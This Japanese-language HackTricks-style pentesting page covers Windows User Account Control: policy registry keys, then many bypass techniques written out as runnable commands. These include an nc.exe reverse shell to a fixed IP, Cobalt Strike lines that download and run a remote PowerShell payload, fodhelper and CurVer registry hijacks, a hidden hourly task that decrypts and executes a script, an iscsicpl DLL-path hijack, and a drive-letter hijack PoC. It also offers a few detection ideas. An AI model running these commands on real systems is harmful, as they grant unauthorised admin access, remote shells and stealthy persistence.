# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**昇格された操作に対する確認プロンプト**を有効にする機能です。アプリケーションには異なる `integrity` level があり、**高い level** のプログラムは、**システムを危険にさらす可能性のある**タスクを実行できます。UAC が有効な場合、アプリケーションとタスクは、管理者が明示的にこれらのアプリケーション/タスクにシステム上で管理者レベルのアクセス権を与えて実行することを承認しない限り、常に**管理者でないアカウントの security context** で実行されます。これは、管理者を意図しない変更から保護するための便利機能ですが、セキュリティ境界とは見なされません。

integrity levels についての詳細は以下を参照してください:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC が有効な場合、管理者ユーザーには 2 つの token が与えられます。通常レベルで通常の操作を行うための standard user key と、admin privileges を持つものです。

この [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) では、UAC の動作について非常に詳しく説明しており、logon process、user experience、UAC architecture を含みます。Administrators は security policies を使って、ローカルレベルで組織固有の UAC の動作を設定できます（secpol.msc を使用）、または Active Directory domain environment で Group Policy Objects (GPO) を通じて設定および配布できます。各設定の詳細は [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) にあります。UAC には 10 個の Group Policy settings を設定できます。以下の表で追加の詳細を示します:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

**local security policies**（ほとんどのシステムでは "secpol.msc"）は、デフォルトで**非 admin ユーザーによる software installations を防止**するように設定されています。つまり、非 admin ユーザーがあなたの software の installer をダウンロードできたとしても、admin account なしでは実行できません。

### Registry Keys to Force UAC to Ask for Elevation

admin rights のない standard user として、特定の操作を実行しようとしたときに "standard" account が UAC によって**資格情報の入力を求められる**ようにできます。この操作には、**UAC bypass** がある場合、または attacker がすでに admin として logged in している場合を除き、admin permissions が必要な特定の **registry keys** の変更が必要です。

ユーザーが **Administrators** group に属している場合でも、これらの変更により、管理操作を行うためにユーザーは**アカウントの資格情報を再入力**する必要があります。

**唯一の欠点は、この方法を動作させるには UAC が無効になっている必要があることですが、本番環境ではその可能性は低いです。**

変更する必要がある registry keys と entries は以下のとおりです（括弧内は default values）:

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

これは Local Security Policy tool から手動でも設定できます。変更後、管理操作を行う際にユーザーへ資格情報の再入力を求めるようになります。

### Note

**User Account Control is not a security boundary.** したがって、standard users は local privilege escalation exploit なしに自分の account から抜け出して administrator rights を得ることはできません。

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode は integrity checks を使用して、high-integrity-level の process（web browsers など）が low-integrity-level の data（temporary Internet files folder など）へアクセスするのを防ぎます。これは browser を low-integrity token で実行することで行われます。browser が low-integrity zone に保存された data へアクセスしようとすると、operating system が process の integrity level を確認し、それに応じて access を許可します。この機能は、remote code execution 攻撃が system 上の sensitive data にアクセスするのを防ぐのに役立ちます。
- user が Windows に log on すると、system はその user の privileges の list を含む access token を作成します。Privileges は、user の rights と capabilities の組み合わせとして定義されます。token には user の credentials の list も含まれており、これは computer および network 上の resources に対して user を authenticate するために使われる credentials です。

### Autoadminlogon

起動時に特定の user を自動的に log on するよう Windows を設定するには、**`AutoAdminLogon` registry key** を設定します。これは kiosk 環境や testing purpose に有用です。password が registry に露出するため、secure な system でのみ使用してください。

Registry Editor または `reg add` を使って、以下の keys を設定します。

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

通常の logon 動作に戻すには、`AutoAdminLogon` を 0 に設定します。

## UAC bypass

> [!TIP]
> victim に graphicial access がある場合、UAC prompt が表示されたら "Yes" をクリックするだけなので、UAC bypass は簡単です

UAC bypass が必要になるのは次の状況です: **UAC が有効で、process が medium integrity context で実行されており、かつ user が administrators group に属している場合**。

**UAC を highest security level (Always) で bypass するのは、他の level (Default) よりもはるかに難しい** ことに注意してください。

### UAC disabled

もし UAC がすでに disabled（`ConsentPromptBehaviorAdmin` が **`0`**）なら、次のような方法で **admin privileges（high integrity level）を持つ reverse shell を execute できます**:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### トークン複製による UAC bypass

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** 基本的な UAC "bypass"（フル file system access）

Administrators グループ内の user で shell を持っている場合、SMB 経由で共有されている **C$** をローカルの新しい disk として **mount the C$** でき、**file system 内のすべてに access** できます（Administrator の home folder さえも）。

> [!WARNING]
> **このトリックはもう動作しないようです**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Cobalt Strike による UAC bypass

Cobalt Strike の手法は、UAC が最大のセキュリティレベルに設定されていない場合にのみ機能します
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** と **Metasploit** にも **UAC** を **bypass** するための複数のモジュールがあります。

### KRBUACBypass

Documentation と tool は [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) は、いくつかの UAC bypass exploits を **compilation** したものです。**visual studio** または **msbuild** を使って **UACME を compile する** 必要があることに注意してください。compile によって複数の executables（例: `Source\Akagi\outout\x64\Debug\Akagi.exe`）が作成されるので、**どれが必要か**を知っておく必要があります。\
いくつかの bypass は **他の programs を promtp** して、**user** に何かが起きていることを **alert** するため、**注意**してください。

UACME には、**各 technique が動作し始めた build version** があります。自分の version に影響する technique を検索できます:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
また、[this](https://en.wikipedia.org/wiki/Windows_10_version_history) page を使うと、build versions から Windows release `1607` を取得できます。

### UAC Bypass – fodhelper.exe (Registry hijack)

trusted binary `fodhelper.exe` は modern Windows で auto-elevated されます。起動時に、`DelegateExecute` verb を検証せずに以下の per-user registry path を参照します。そこに command を仕込むことで、Medium Integrity process（user is in Administrators）が UAC prompt なしで High Integrity process を spawn できます。

fodhelper が参照する Registry path:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell の手順（ペイロードを設定してからトリガー）</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
メモ:
- 現在のユーザーが Administrators のメンバーで、UAC level が default/lenient（Always Notify with extra restrictions ではない）場合に動作する。
- 64-bit Windows 上で 32-bit process から 64-bit PowerShell を起動するには `sysnative` path を使う。
- payload は任意の command（PowerShell、cmd、または EXE path）でよい。stealth のため、UI のプロンプトは避ける。

#### CurVer/extension hijack variant (HKCU only)

最近の `fodhelper.exe` を悪用する sample では `DelegateExecute` を使わず、代わりに per-user の `CurVer` value を介して **`ms-settings` ProgID を redirect** する。auto-elevated binary は依然として handler を `HKCU` 下で解決するため、keys を植えるのに admin token は不要である:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
昇格されると、malware は一般的に `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` を `0` に設定して **今後のプロンプトを無効化** し、その後さらに defense evasion（例: `Add-MpPreference -ExclusionPath C:\ProgramData`）を行い、high integrity で実行されるよう persistence を再作成します。典型的な persistence task では、**XORで暗号化された PowerShell script** を disk 上に保存し、毎時それを decode/execute します:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
このバリアントはドロッパーをさらにクリーンアップし、ステージされたペイロードだけを残します。そのため検出は、**`CurVer` hijack**、`ConsentPromptBehaviorAdmin` の改ざん、Defender exclusion の作成、または PowerShell を in-memory で復号する scheduled tasks の監視に依存することになります。

#### さらなる UAC bypass

ここで使う**すべて**の technique は、AUC を bypass するために被害者との**完全な対話型シェル**を**必要**とします（一般的な nc.exe shell だけでは不十分です）。

**meterpreter** session を使えば実現できます。**Session** 値が **1** の **process** に migrate します:

![](<../../images/image (863).png>)

(_explorer.exe_ が使えるはずです)

### GUI を使った UAC Bypass

**GUI にアクセスできる**なら、UAC prompt が出たときにそのまま承認すればよく、実際には bypass はあまり必要ありません。つまり、GUI へのアクセスを得られれば UAC を bypass できます。

さらに、誰かが使っていた GUI session（RDP 経由の可能性あり）を得られた場合、**administrator として実行されている tool** がいくつかあり、たとえば [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif) のように、UAC に再度促されることなく **admin として** 直接 **cmd** などを **run** できることがあります。これは少し**stealthy** かもしれません。

### noisy な brute-force UAC bypass

ノイズが出ても気にしないなら、いつでも [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) のようなものを **run** して、**user が許可するまで権限昇格を要求し続ける**ことができます。

### 自分で bypass を作る - Basic UAC bypass methodology

**UACME** を見ると、**ほとんどの UAC bypass は Dll Hijacking の vulnerabilit**y を悪用していることが分かります（主に悪意ある dll を _C:\Windows\System32_ に書き込む手口です）。[Dll Hijacking vulnerability の見つけ方はここを読んでください](../windows-local-privilege-escalation/dll-hijacking/index.html)。

1. **autoelevate** する binary を見つける（実行時に high integrity level で動くことを確認する）。
2. procmon で、**DLL Hijacking** の対象になりうる "**NAME NOT FOUND**" イベントを探す。
3. おそらく、書き込み権限のない **protected paths**（例: C:\Windows\System32）内に DLL を**書き込む**必要があります。これには次を使って回避できます:
1. **wusa.exe**: Windows 7,8, 8.1。保護された path 内へ CAB file の内容を展開できます（この tool は high integrity level で実行されるためです）。
2. **IFileOperation**: Windows 10.
4. DLL を protected path にコピーし、脆弱で autoelevated な binary を実行する **script** を用意する。

### 別の UAC bypass technique

**autoElevated binary** が registry から実行される binary や command の **name/path** を**読み取ろうとする**かを確認する方法です（特に、その binary がこの情報を **HKCU** 内で探す場合に有効です）。

### `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack による UAC bypass

32-bit の `C:\Windows\SysWOW64\iscsicpl.exe` は **auto-elevated** な binary で、search order により `iscsiexe.dll` を load するよう悪用できます。悪意ある `iscsiexe.dll` を **user-writable** な folder に置き、さらに current user の `PATH`（たとえば `HKCU\Environment\Path` 経由）をその folder が検索されるように変更できれば、Windows は UAC prompt を表示せずに attacker の DLL を昇格した `iscsicpl.exe` process 内に load することがあります。

実用上の注意:
- これは current user が **Administrators** に属していても、UAC のために **Medium Integrity** で実行されている場合に有効です。
- この bypass で重要なのは **SysWOW64** 側の copy です。**System32** 側の copy は別 binary として扱い、挙動を個別に確認してください。
- この primitive は **auto-elevation** と **DLL search-order hijacking** の組み合わせなので、他の UAC bypass で使うのと同じ ProcMon の workflow が、missing DLL load の確認に役立ちます。

最小の flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Detection ideas:
- `reg add` / registry writes to `HKCU\Environment\Path` の直後に `C:\Windows\SysWOW64\iscsicpl.exe` の実行が続く場合に alert。
- `%TEMP%` や `%LOCALAPPDATA%\Microsoft\WindowsApps` のような **user-controlled** locations にある `iscsiexe.dll` を hunt。
- `iscsicpl.exe` の起動と、通常の Windows ディレクトリ外からの unexpected な child processes や DLL loads を相関分析する。

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 の “Administrator Protection” は、shadow-admin tokens と per-session の `\Sessions\0\DosDevices/<LUID>` maps を使用する。ディレクトリは `SeGetTokenDeviceMap` により、最初の `\??` resolution 時に遅延作成される。攻撃者が shadow-admin token を **SecurityIdentification** でのみ impersonate すると、ディレクトリは攻撃者を **owner** として作成され（`CREATOR OWNER` を継承する）、`\GLOBAL??` より優先される drive-letter links を作成できる。

**Steps:**

1. low-privileged session から `RAiProcessRunOnce` を呼び出し、promptless な shadow-admin `runonce.exe` を起動する。
2. その primary token を **identification** token に duplicate し、`\??` を open する際に impersonate して、攻撃者所有の `\Sessions\0\DosDevices/<LUID>` の作成を強制する。
3. そこに attacker-controlled storage を指す `C:` symlink を作成する。その session での後続の filesystem access は `C:` を attacker path に解決するため、prompt なしで DLL/file hijack が可能になる。

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – User Account Control の仕組み](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: 0-Day Exploitation Against Southeast Asian Government Targets](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
